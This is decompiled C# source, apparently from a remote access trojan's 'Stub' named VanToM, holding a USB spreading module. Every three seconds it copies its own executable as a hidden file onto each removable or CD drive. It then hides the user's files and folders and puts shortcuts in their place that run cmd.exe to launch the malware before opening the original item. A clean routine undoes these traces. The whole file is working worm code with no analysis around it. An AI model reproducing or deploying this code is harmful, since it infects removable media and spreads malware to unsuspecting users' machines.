using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Stub
{
	// Token: 0x0200003A RID: 58
	public class USB
	{
		// Token: 0x0600014F RID: 335 RVA: 0x0000FEAC File Offset: 0x0000E0AC
		public USB()
		{
			this.Off = false;
			this.thread = null;
			this.ExeName = "VanToM.exe";
		}

		// Token: 0x06000150 RID: 336 RVA: 0x0000FED0 File Offset: 0x0000E0D0
		public void Start()
		{
			bool flag = this.thread == null;
			if (flag)
			{
				this.thread = new Thread(new ThreadStart(this.usb), 1);
				this.thread.Start();
			}
		}

		// Token: 0x06000151 RID: 337 RVA: 0x0000FF18 File Offset: 0x0000E118
		public void clean()
		{
			this.Off = true;
			while (this.thread != null)
			{
				Thread.Sleep(1);
			}
			foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
			{
				try
				{
					bool isReady = driveInfo.IsReady;
					if (isReady)
					{
						bool flag = driveInfo.DriveType == DriveType.Removable | driveInfo.DriveType == DriveType.CDRom;
						if (flag)
						{
							bool flag2 = File.Exists(driveInfo.Name + this.ExeName);
							if (flag2)
							{
								File.SetAttributes(driveInfo.Name + this.ExeName, FileAttributes.Normal);
								File.Delete(driveInfo.Name + this.ExeName);
							}
							foreach (string text in Directory.GetFiles(driveInfo.Name))
							{
								try
								{
									File.SetAttributes(text, FileAttributes.Normal);
									flag2 = text.ToLower().EndsWith(".lnk");
									if (flag2)
									{
										File.Delete(text);
									}
								}
								catch (Exception ex)
								{
								}
							}
							foreach (string path in Directory.GetDirectories(driveInfo.Name))
							{
								try
								{
									DirectoryInfo directoryInfo = new DirectoryInfo(path);
									directoryInfo.Attributes = FileAttributes.Normal;
								}
								catch (Exception ex2)
								{
								}
							}
						}
					}
				}
				catch (Exception ex3)
				{
				}
			}
		}

		// Token: 0x06000152 RID: 338 RVA: 0x00010134 File Offset: 0x0000E334
		public void usb()
		{
			this.Off = false;
			while (!this.Off)
			{
				foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
				{
					try
					{
						bool isReady = driveInfo.IsReady;
						if (isReady)
						{
							bool flag = (driveInfo.TotalFreeSpace > 0L & driveInfo.DriveType == DriveType.Removable) | driveInfo.DriveType == DriveType.CDRom;
							if (flag)
							{
								try
								{
									bool flag2 = File.Exists(driveInfo.Name + this.ExeName);
									if (flag2)
									{
										File.SetAttributes(driveInfo.Name + this.ExeName, FileAttributes.Normal);
									}
									File.Copy(Application.ExecutablePath, driveInfo.Name + this.ExeName, true);
									File.SetAttributes(driveInfo.Name + this.ExeName, FileAttributes.Hidden);
									foreach (string text in Directory.GetFiles(driveInfo.Name))
									{
										flag2 = (Operators.CompareString(Path.GetExtension(text).ToLower(), ".lnk", false) != 0 & Operators.CompareString(text.ToLower(), driveInfo.Name.ToLower() + this.ExeName.ToLower(), false) != 0);
										if (flag2)
										{
											File.SetAttributes(text, FileAttributes.Hidden);
											File.Delete(driveInfo.Name + new FileInfo(text).Name + ".lnk");
											object instance = NewLateBinding.LateGet(Interaction.CreateObject("WScript.Shell", ""), null, "CreateShortcut", new object[]
											{
												driveInfo.Name + new FileInfo(text).Name + ".lnk"
											}, null, null, null);
											NewLateBinding.LateSetComplex(instance, null, "TargetPath", new object[]
											{
												"cmd.exe"
											}, null, null, false, true);
											NewLateBinding.LateSetComplex(instance, null, "WorkingDirectory", new object[]
											{
												""
											}, null, null, false, true);
											NewLateBinding.LateSetComplex(instance, null, "Arguments", new object[]
											{
												string.Concat(new string[]
												{
													"/c start ",
													this.ExeName.Replace(" ", "\" \""),
													"&start ",
													new FileInfo(text).Name.Replace(" ", "\" \""),
													" & exit"
												})
											}, null, null, false, true);
											NewLateBinding.LateSetComplex(instance, null, "IconLocation", new object[]
											{
												this.GetIcon(Path.GetExtension(text))
											}, null, null, false, true);
											NewLateBinding.LateCall(instance, null, "Save", new object[0], null, null, null, true);
										}
									}
									foreach (string path in Directory.GetDirectories(driveInfo.Name))
									{
										File.SetAttributes(path, FileAttributes.Hidden);
										File.Delete(driveInfo.Name + new DirectoryInfo(path).Name + " .lnk");
										object instance2 = NewLateBinding.LateGet(Interaction.CreateObject("WScript.Shell", ""), null, "CreateShortcut", new object[]
										{
											driveInfo.Name + Path.GetFileNameWithoutExtension(path) + " .lnk"
										}, null, null, null);
										NewLateBinding.LateSetComplex(instance2, null, "TargetPath", new object[]
										{
											"cmd.exe"
										}, null, null, false, true);
										NewLateBinding.LateSetComplex(instance2, null, "WorkingDirectory", new object[]
										{
											""
										}, null, null, false, true);
										NewLateBinding.LateSetComplex(instance2, null, "Arguments", new object[]
										{
											string.Concat(new string[]
											{
												"/c start ",
												this.ExeName.Replace(" ", "\" \""),
												"&explorer /root,\"%CD%",
												new DirectoryInfo(path).Name,
												"\" & exit"
											})
										}, null, null, false, true);
										NewLateBinding.LateSetComplex(instance2, null, "IconLocation", new object[]
										{
											"%SystemRoot%\\system32\\SHELL32.dll,3"
										}, null, null, false, true);
										NewLateBinding.LateCall(instance2, null, "Save", new object[0], null, null, null, true);
									}
								}
								catch (Exception ex)
								{
								}
							}
						}
					}
					catch (Exception ex2)
					{
					}
				}
				Thread.Sleep(3000);
			}
			this.thread = null;
		}

		// Token: 0x06000153 RID: 339 RVA: 0x00010670 File Offset: 0x0000E870
		public string GetIcon(string ext)
		{
			string result;
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Classes\\", false);
				string text = Conversions.ToString(registryKey.OpenSubKey(Conversions.ToString(Operators.ConcatenateObject(registryKey.OpenSubKey(ext, false).GetValue(""), "\\DefaultIcon\\"))).GetValue("", ""));
				bool flag = !text.Contains(",");
				if (flag)
				{
					text += ",0";
				}
				result = text;
			}
			catch (Exception ex)
			{
				result = "";
			}
			return result;
		}

		// Token: 0x0400012E RID: 302
		private bool Off;

		// Token: 0x0400012F RID: 303
		private Thread thread;

		// Token: 0x04000130 RID: 304
		public string ExeName;
	}
}
